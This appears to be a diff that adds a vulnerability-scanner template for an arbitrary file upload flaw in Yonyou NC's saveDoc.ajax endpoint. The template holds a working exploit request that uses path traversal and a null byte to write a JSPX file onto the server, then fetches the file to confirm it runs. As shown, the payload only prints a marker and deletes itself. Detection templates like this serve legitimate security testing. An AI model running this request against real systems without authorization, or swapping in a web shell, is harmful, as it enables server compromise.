@@ -1,0 +1,28 @@
+id:
+
+info:
+  name: 用友NC saveDoc.ajax 存在任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /uapws/saveDoc.ajax?ws=/../../test1.jspx%00
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
+          <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
+       <hi:scriptlet>
+                out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
+       </hi:scriptlet>
+    </hi>
+response1:
+requests2:
+  method: GET
+  path: /uapws/test1.jspx
+response2:
+  headers:
+  body: Hello World
+  code:
